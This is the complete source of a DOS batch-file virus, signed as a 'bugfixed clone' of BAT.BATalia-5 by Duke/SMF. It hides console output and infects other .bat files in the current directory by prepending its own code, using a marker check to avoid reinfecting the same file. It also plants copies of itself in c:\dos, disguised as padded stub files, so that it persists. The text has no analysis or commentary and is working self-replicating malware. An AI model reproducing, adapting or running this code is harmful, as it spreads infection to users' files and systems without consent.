@rem YYY
@ctty nul
if "%1=="5 goto s
for %%b in (*.bat) do call %0 5 %%b
goto b
:s
copy %2 p
echo NNN>>p
echo 1>z1
echo 2>z2
echo 3>z3
del z? /p<p
if exist z? goto i
goto e
:i
type %0>b
copy b a /a
copy %2 t
copy /b a+t %2
goto e
:b
echo rem               >x
copy x+x+x+x y
copy y+y+y+y+y+y z
echo @%%comspec%% nul /c copy c:\dos\y %%0>>z
copy z c:\dos\x
copy %0 c:\dos\y
del ??
ctty con
@copy c:\dos\x %0 >nul
:e
rem BAT.BATalia-5 bugfixed clone by Duke/SMF
